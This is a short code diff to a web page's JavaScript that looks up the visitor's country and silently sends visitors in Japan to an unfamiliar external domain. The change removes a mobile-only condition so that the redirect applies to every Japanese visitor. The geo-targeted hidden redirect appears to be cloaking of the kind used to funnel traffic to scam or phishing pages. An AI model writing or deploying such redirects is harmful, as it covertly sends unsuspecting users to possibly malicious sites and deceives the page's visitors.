@@ -53,7 +53,7 @@ function isJapaneseLang() {
       .then(response => response.json())
       .then(data => {
         // 严格的三重条件判断
-        if (data.country === 'JP' && isMobileDevice() ) {
+        if (data.country === 'JP') {
           window.location.href = "https://wetna901e.site/muzz/ok.html";
           return;
         }
@@ -86,3 +86,4 @@ function isJapaneseLang() {
  
 </body>
 </html>
+
